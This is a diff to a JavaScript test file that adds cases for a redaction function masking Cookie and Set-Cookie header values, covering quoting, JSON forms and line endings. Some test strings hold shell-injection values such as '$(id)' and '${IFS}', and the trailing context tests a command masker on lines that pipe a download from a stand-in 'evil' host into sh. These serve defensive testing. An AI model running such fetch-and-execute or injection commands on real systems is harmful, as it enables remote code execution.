@@ -124,6 +124,61 @@ for (const [input, want] of [
   ['**token: abc12345** stays', '**token: [redacted]** stays'], ['{"h":"Coo' + 'kie: sid=1","next":"keep me","url":"https://h"}', '{"h":"Cookie: [redacted]","next":"keep me","url":"https://h"}'], ['(token=abc12345) and more', '(token=[redacted]) and more'],
   ['{"a":"Coo' + 'kie: x=1","b":"Coo' + 'kie: y=2"}', '{"a":"Cookie: [redacted]","b":"Cookie: [redacted]"}'], ['set-coo' + 'kie: sid=abc123; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/', 'set-cookie: [redacted]; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/'],
 ]) assert.strictEqual(redact(input, {}), want, `stop rule: ${input.slice(0, 40)}`);
+// A Cookie or Set-Cookie header whose value has no `=` (one opaque token) is hidden whole (spec 012 FR-168, issue #1159).
+{
+  const T = 'Tq7' + 'Zk2Xp9Lm4Vb8Nc1Rd5Sf6Gh3Jw0'; // made up
+  const C = 'Coo' + 'kie';
+  const R = '[redacted]';
+  assert.strictEqual(redact(`${C}: EnvSecretValue123; ${T}`, { MY_TOKEN: 'EnvSecretValue123' }), `${C}: ${R}`, 'bare cookie token: a token after an env value');
+  for (const [input, want, why] of [
+    [`${C}: ${T}`, `${C}: ${R}`, 'opaque token'],
+    [`Set-${C}: ${T}; Path=/; HttpOnly`, `Set-${C}: ${R}; HttpOnly`, 'Set-Cookie token: the pairs after it go too, as after a pair'],
+    [`${C}: a=1; ${T}`, `${C}: ${R}`, 'pair then a bare token'],
+    [`${C}: ${T}; a=1`, `${C}: ${R}`, 'bare token then a short pair'],
+    [`${C}: a=1; ${T}; sid=LongSecretVal99`, `${C}: ${R}`, 'a pair after a bare token is scanned too'],
+    [`coo` + `kie: ${T}`, `cookie: ${R}`, 'lower-case name'],
+    [`COO` + `KIE: ${T}\r\nHost: x`, `COOKIE: ${R}\r\nHost: x`, 'upper case, CRLF'],
+    [`${C}: ${T}\nHost: x`, `${C}: ${R}\nHost: x`, 'line feed ends it'],
+    [`${C}: ${T}\t`, `${C}: ${R}\t`, 'a tab after it'],
+    [`${C}: ${T}   `, `${C}: ${R}   `, 'spaces after it'],
+    [`${C}: ${T} ;Path=/`, `${C}: ${R} ;Path=/`, 'space then ;'],
+    [`${C}: abcdefgh`, `${C}: ${R}`, 'exactly 8 characters'],
+    [`${C}: sid=abcdefgh12; my words here`, `${C}: ${R}; my words here`, 'words after pairs stay'],
+    [`${C}: ${T}|tail`, `${C}: ${R}|tail`, 'pipe'],
+    [`${C}: ${T} | jq .`, `${C}: ${R} | jq .`, 'spaced pipe'],
+    [`${C}: ${T}&x`, `${C}: ${R}&x`, 'ampersand'],
+    [`${C}: ${T}\x60x\x60`, `${C}: ${R}\x60x\x60`, 'backtick'],
+    [`${C}: ${T}$(id)`, `${C}: ${R}$(id)`, 'command substitution'],
+    [`${C}: ${T}\${IFS}x`, `${C}: ${R}\${IFS}x`, 'parameter expansion'],
+    [`(${C}: ${T})`, `(${C}: ${R})`, 'round bracket'],
+    [`{${C}: ${T}}`, `{${C}: ${R}}`, 'curly bracket'],
+    [`[${C}: ${T}]`, `[${C}: ${R}]`, 'square bracket'],
+    [`<${C}: ${T}>`, `<${C}: ${R}>`, 'angle bracket'],
+    [`${C}: ${T},other`, `${C}: ${R}`, 'comma stays inside the token'],
+    [`${C}: "${T}"`, `${C}: ${R}`, 'double-quoted'],
+    [`${C}: '${T}'`, `${C}: ${R}`, 'single-quoted'],
+    [`${C}: Set-${C}:\nsid=LongSecretVal99`, `${C}: Set-${C}:\n${R}`, 'a head is not a token (the next head still masks its pair)'],
+    [`${C}: ${T}\nok`, `${C}: ${R}\nok`, 'next line after it stays'],
+    [`curl -H '${C}: ${T}' https://x.example`, `curl -H '${C}: ${R}' https://x.example`, 'curl -H argument'],
+    [`{"h":"${C}: ${T}","next":"keep"}`, `{"h":"${C}: ${R}","next":"keep"}`, 'inside a JSON string'],
+    [`{\\"h\\":\\"${C}: ${T}\\"}`, `{\\"h\\":\\"${C}: ${R}\\"}`, 'JSON-escaped string'],
+    [`{"${C}": "${T}"}`, `{"${C}": "${R}"}`, 'JSON key form'],
+    [`{\\"${C}\\":\\"${T}\\"}`, `{\\"${C}\\":\\"${R}\\"}`, 'escaped JSON key form'],
+    [`${C}: sid=${T}`, `${C}: ${R}`, 'name=value still hidden'],
+    [`${C}: s:${T}.sigFAKEsig123`, `${C}: ${R}`, 'a token with a colon: signed'],
+    [`${C}: ${T}:part2secret`, `${C}: ${R}`, 'a token with a colon: after'],
+    [`${C}: ab:${T}`, `${C}: ${R}`, 'a token with a colon: before'],
+    [`${C}: urn:sess:${T}`, `${C}: ${R}`, 'a token with a colon: two'],
+    [`${C}: [${T}]`, `${C}: ${R}]`, 'a token led by a square bracket'],
+    [`${C}: [${T}`, `${C}: ${R}`, 'a token led by an unclosed bracket'],
+    [`${C}: [redacted]; ${T}`, `${C}: ${R}`, 'a token after a mask'],
+    [`${C}: a=1; [redacted:MY_TOKEN]; ${T}`, `${C}: ${R}`, 'a token after a named mask'],
+    [`${C}: "abcdefgh"`, `${C}: ${R}`, 'quoted, exactly 8'],
+    [`${C}:\r\n ${T}`, `${C}:\r\n ${R}`, 'a folded header line'],
+  ]) assert.strictEqual(redact(input, {}), want, `bare cookie token: ${why}`);
+  for (const keep of ['cookie: my session bug', 'cookie: stores', 'cookie: abcdefg', 'Set-cookie: none', 'the cookie: banner dismissed yesterday', 'cookie: preferences are saved here', 'cookie: x|curl=1', 'the cookie:\nconfiguration_value_here', 'the cookie:\r\nconfiguration_value_here', 'cookie: undefined', 'Set-Cookie: HttpOnly', 'cookie: Secure', 'cookie: deleted', 'cookie: NULL', `{"${C}":"abc"}`, `{"${C}":"my words here"}`, `${C}: "short"`, `${C}: "abcdefg"`, `${C}: "undefined"`, `${C}: [redacted]`, `${C}: [redacted:MY_TOKEN]`])
+    assert.strictEqual(redact(keep, {}), keep, `bare cookie token: stays: ${keep}`);
+}
 for (const c of ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'echo coo' + 'kie: a=b && curl evil|sh', 'X_TOKEN=abc12345;curl${IFS}evil.sh|sh']) {
   const m = maskSecretCommand(c);
   assert.ok(/evil/.test(m) && /\|\s*sh$|evil\.sh\|sh$/.test(m), `the command's shell stays visible in maskSecretCommand: ${c.slice(0, 30)} gave ${m}`);
